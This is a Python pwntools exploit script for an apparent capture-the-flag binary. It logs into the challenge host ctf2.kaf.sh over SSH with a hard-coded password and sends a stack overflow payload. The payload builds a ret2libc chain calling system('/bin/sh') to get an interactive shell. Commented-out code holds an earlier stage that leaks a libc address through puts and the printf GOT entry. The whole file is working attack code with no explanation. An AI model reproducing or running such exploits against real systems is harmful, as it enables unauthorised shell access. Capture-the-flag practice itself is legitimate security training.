from pwn import *

def exploit():
    # p = process("./SA")
    # p = ssh(host="ctf2.kaf.sh", port=7020, user="yeet", password="12345678")
    p = process(["sshpass", "-p", "12345678", "ssh", "yeet@ctf2.kaf.sh", "-p", "7020"])
    libc_base = 0xf7df2000
    libc_system = libc_base + 0x03cd10
    libc_binsh = libc_base + 0x17b8cf

    payload = ''
    payload += 'A' * 4 + '\x00'
    payload += 'A' * 19
    payload += p32(libc_system)
    payload += "JUNK"
    payload += p32(libc_binsh)
    p.sendline("A")
    p.sendline(payload)
    # binary = ELF("SA", checksec=False)
    # puts_plt = binary.plt["puts"]
    # printf_got = binary.got["printf"]
    # main = binary.symbols["main"]
    # p.sendline("A")

    # payload = ''
    # payload += 'A' * 4 + '\x00'
    # payload += 'A' * 19
    # payload += p32(puts_plt)
    # payload += p32(main)
    # payload += p32(printf_got)
    # # gdb.attach(p, """
    # #             brva *0x0804861b
    # #             """)
    # p.sendline(payload)
    # p.sendline("A")
    # p.sendline("A")
    # p.recvuntil("Valid Password\n")
    # libc_leak = u32(p.recv(4))
    # print hex(libc_leak)
    # p.recvuntil("Valid Password\n")
    
    # libc_leak = u32(p.recv(4))
    # log.info("Libc leak : {}".format(hex(libc_leak)))
    # libc_base = libc_leak - 0x0512d0
    # log.info("Libc base : {}".format(hex(libc_base)))
    # libc_system = libc_base + 0x03d200
    # log.info("Libc system : {}".format(hex(libc_system)))
    # libc_binsh = libc_base + 0x17e0cf
    # log.info("Libc /bin/sh : {}".format(hex(libc_binsh)))
    
    # p.sendline("A")

    # payload = ''
    # payload += 'A' * 4 + '\x00'
    # payload += 'A' * 19
    # payload += p32(libc_system)
    # payload += "JUNK"
    # payload += p32(libc_binsh)

    # p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    exploit()